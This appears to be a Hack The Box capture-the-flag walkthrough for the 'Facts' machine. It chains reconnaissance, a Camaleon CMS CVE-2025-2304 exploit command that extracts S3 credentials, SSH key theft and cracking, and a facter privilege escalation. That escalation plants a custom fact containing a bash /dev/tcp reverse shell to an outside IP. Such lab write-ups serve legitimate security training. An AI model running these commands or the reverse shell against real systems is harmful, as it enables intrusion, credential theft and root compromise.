# HTB Walkthrough — Facts

<p align="center">
  <img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/bdcd209c32f156fbfb2268f099971f75.png" alt="HTB Facts Machine" width="220" />
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Nmap-Scan-blue" alt="Nmap" />
  <img src="https://img.shields.io/badge/Gobuster-Dir%20Enum-orange" alt="Gobuster" />
  <img src="https://img.shields.io/badge/AWS%20CLI-Endpoint%2054321-yellow" alt="AWS CLI" />
  <img src="https://img.shields.io/badge/John%20the%20Ripper-SSH%20Crack-red" alt="John the Ripper" />
  <img src="https://img.shields.io/badge/OpenSSH-Key%20Auth-green" alt="OpenSSH" />
  <img src="https://img.shields.io/badge/Facter-PrivEsc-purple" alt="Facter" />
  <img src="https://img.shields.io/badge/Camaleon%20CMS-CVE--2025--2304-black" alt="Camaleon CMS" />
</p>

- **Author**: ElJoamy
- **Machine**: Facts
- **Machine URL**: https://app.hackthebox.com/machines/Facts

> [!IMPORTANT]  
> This is one possible attack path. There may be other valid paths and techniques. This write-up is for educational purposes only.

## Goal
- Obtain initial access via Camaleon CMS.
- Exfiltrate AWS S3 credentials and SSH keys.
- Gain SSH access as a user.
- Escalate privileges to root using facter.
- Capture the flags.

## **Recon (Nmap)**
**Run version and default script scan:**

```bash
nmap -sV -sC 10.129.244.96 -oN nmap.txt
```

**Why these flags matter:**
- `-sV` fingerprints running services to identify versions and potential CVEs.
- `-sC` runs default NSE scripts (auth checks, SSL info, HTTP redirects), giving fast, safe baseline insights.

**Key results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
```

**Notes:**
- Open ports: 22 (SSH), 80 (HTTP).
- Virtual host redirect to facts.htb.
- The HTTP title revealing a vhost indicates name-based routing; mapping facts.htb locally is required to resolve correctly.

**Add host entry:**
```
10.129.244.96 facts.htb
```

## **Web Enumeration (Gobuster)**
**Enumerate directories:**
```bash
gobuster dir -u http://facts.htb/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o gobuster.txt
```

**Interesting endpoints:**
```
index (200)
search (200)
admin (302) [--> http://facts.htb/admin/login]
...
```

**Why this wordlist:** The “lowercase 2.3 medium” list helps on Linux web roots that commonly use lowercase paths and gives a good speed/coverage tradeoff. A 302 to `/admin/login` confirms an admin panel with an authentication flow worth testing.

**Visit /admin/login and create an account:**
- Username: test
- Password: test

**After login, role**: client. **Dashboard shows:**
```
Camaleon CMS v2.9.0
```

## **Exploitation — Camaleon CMS CVE-2025-2304**
**Reference**: https://github.com/Alien0ne/CVE-2025-2304

This exploit lets an authenticated **client** escalate privileges, change other users’ passwords, and extract **AWS** secrets.

**Root cause (high level):** Improper authorization checks in Camaleon CMS allow actions reserved for admins (e.g., role updates, secret retrieval) to be triggered by a non-admin session.

**Run:**
```bash
python3 exploit.py -u http://facts.htb -U test -P test --newpass test1 -e -r
```
**Parameters:**
- -u: target URL
- -U/-P: credentials
- --newpass: new password to set
- -e: extract AWS secrets (S3)
- -r: revert role back to client after exploitation

**Sample output (short):**
```
Updated User Role: admin
Extracting S3 Credentials
   s3 access key: AKIA1CD0FEF83C3810B8
   s3 secret key: rH61JGpjEMkR/BF5vzSxRSp1vhwIlMiZg8Av67gj
   s3 endpoint: http://localhost:54321
```

## **Post-Exploitation — Access S3**
**Configure AWS:**
```bash
aws configure
```

**List buckets via the custom endpoint:**
```bash
aws --endpoint-url http://facts.htb:54321 s3 ls
```
**Buckets:**
```
internal
randomfacts
```

**List internal contents:**
```bash
aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal
```
**We see .ssh; list and download:**
```bash
aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 id_ed25519
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/authorized_keys authorized_keys
```

**Why the endpoint URL:** The service likely uses a local S3-compatible storage (e.g., MinIO) exposed on port 54321. The AWS CLI needs `--endpoint-url` to talk to non-AWS S3 implementations.

## **Key Cracking and SSH**
**Format the private key for cracking:**
```bash
python3 /usr/share/john/ssh2john.py id_ed25519 > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```

**Prepare key and derive public key (optional):**
```bash
chmod 600 id_ed25519
ssh-keygen -y -f id_ed25519
```

**Why these steps:** SSH enforces strict permissions (`chmod 600`) on private keys. `ssh2john.py` converts SSH private keys into a hash format so John can attempt passphrase cracking if the key is protected.

**SSH in:**
```bash
ssh -i id_ed25519 trivia@facts.htb
```

## **Privilege Enumeration**
**Check sudo rights:**
```bash
sudo -l
```
**Result:**
```
(ALL) NOPASSWD: /usr/bin/facter
```

We can run **facter** as **root** without a password.

**What this means:** A `NOPASSWD` sudoers entry allows the user to execute the listed binary as root without authentication. If that binary loads user-controlled code (plugins, custom scripts), it can often be leveraged for privilege escalation.

## **PrivEsc to root using facter (custom fact)**
**Create a malicious custom fact:**
```bash
echo 'Facter.add(:pwn) do
setcode do
system("bash -c \"bash -i >& /dev/tcp/10.10.15.196/4444 0>&1\"")
end
end' > /tmp/pwn.rb
```

**Start a listener:**
```bash
nc -nlvp 4444
```

**Load custom facts:**
```bash
sudo /usr/bin/facter --custom-dir /tmp
```

**Why it works:** `facter` (Ruby-based) supports loading custom facts from a directory. Run via sudo, any commands executed by those facts inherit root privileges, allowing a root shell via a reverse connection.

**Verify root:**
```bash
id
```
```
uid=0(root) gid=0(root) groups=0(root)
```

## Flags
- Look in the usual paths: /home/<user>/user.txt and /root/root.txt.
- Submit them to the HTB platform.
